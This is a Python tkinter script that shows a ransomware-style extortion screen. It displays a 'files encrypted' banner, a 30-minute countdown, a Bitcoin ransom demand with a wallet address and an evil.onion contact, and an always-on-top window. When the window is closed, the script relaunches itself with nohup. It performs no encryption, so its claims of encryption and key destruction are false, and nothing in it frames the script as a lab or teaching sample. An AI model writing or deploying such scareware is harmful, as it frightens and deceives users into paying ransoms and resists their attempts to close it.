#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk
import time
import sys
import os
from datetime import timedelta

DEADLINE_SECONDS = 30 * 60  # 30 minutes
TITLE = "⚠️ RANSOMWARE - CRITICAL SYSTEM ALERT ⚠️"
RANSOM_AMOUNT = "0.5 Bitcoin ($15,000 USD)"
BITCOIN_WALLET = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
CONTACT = "decrypt@evil.onion"

class RansomwareGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title(TITLE)
        self.root.geometry("700x500")
        self.root.configure(bg="#0a0a0a")

        # Make it topmost, no close button easily, persistent
        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)  # Block close
        self.root.resizable(False, False)

        # Dark red/black ransomware theme
        style = ttk.Style()
        style.theme_use("clam")

        self.create_widgets()
        self.start_countdown()

        # Respawn logic in background
        self.root.mainloop()

    def create_widgets(self):
        # Skull / Warning header
        header = tk.Label(self.root, text="☠ YOUR FILES ARE ENCRYPTED ☠",
                          font=("Courier", 18, "bold"), fg="#ff0000", bg="#0a0a0a")
        header.pack(pady=20)

        self.time_label = tk.Label(self.root, text="29:59",
                                   font=("Courier", 48, "bold"), fg="#ff6666", bg="#0a0a0a")
        self.time_label.pack(pady=10)

        info = tk.Label(self.root, text=f"Pay {RANSOM_AMOUNT} to recover your files.\n"
                                        f"Bitcoin Wallet: {BITCOIN_WALLET}\n"
                                        f"Contact: {CONTACT}\n\n"
                                        "DO NOT shut down or kill this process.\n"
                                        "After deadline, key is destroyed FOREVER.",
                        font=("Arial", 11), fg="#ffffff", bg="#0a0a0a", justify="center")
        info.pack(pady=20, padx=30)

        # Fake progress / status
        self.status = tk.Label(self.root, text="Encryption: COMPLETE | Decryption Key: SECURED",
                               font=("Courier", 10), fg="#ffaa00", bg="#0a0a0a")
        self.status.pack(pady=10)

        # Payment button (fake, shows copy wallet)
        btn_frame = tk.Frame(self.root, bg="#0a0a0a")
        btn_frame.pack(pady=20)

        tk.Button(btn_frame, text="COPY WALLET ADDRESS", command=self.copy_wallet,
                  bg="#ff0000", fg="white", font=("Arial", 12, "bold"), width=25).pack(side="left", padx=10)

        tk.Button(btn_frame, text="MINIMIZE", command=self.minimize,
                  bg="#444444", fg="white", font=("Arial", 12)).pack(side="left", padx=10)

    def start_countdown(self):
        self.end_time = time.time() + DEADLINE_SECONDS
        self.update_timer()

    def update_timer(self):
        remaining = int(self.end_time - time.time())
        if remaining <= 0:
            self.time_label.config(text="00:00", fg="#880000")
            self.status.config(text="⏰ TIME EXPIRED - KEY DESTROYED", fg="#ff0000")
            return

        mins, secs = divmod(remaining, 60)
        self.time_label.config(text=f"{mins:02d}:{secs:02d}")

        # Flash red when low
        if remaining < 300:
            self.time_label.config(fg="#ffff00" if int(time.time()) % 2 else "#ff0000")

        self.root.after(1000, self.update_timer)

    def on_close(self):
        # Respawn immediately if closed
        os.system(f"nohup python3 {os.path.abspath(__file__)} &")
        # Or just ignore: pass

    def copy_wallet(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BITCOIN_WALLET)
        # Fake feedback
        temp = tk.Label(self.root, text="✅ Wallet copied!", fg="#00ff00", bg="#0a0a0a")
        temp.pack()
        self.root.after(2000, temp.destroy)

    def minimize(self):
        self.root.iconify()

if __name__ == "__main__":
    # Prevent multiple instances somewhat
    if len(sys.argv) > 1 and sys.argv[1] == "--from-persistence":
        RansomwareGUI()
    else:
        RansomwareGUI()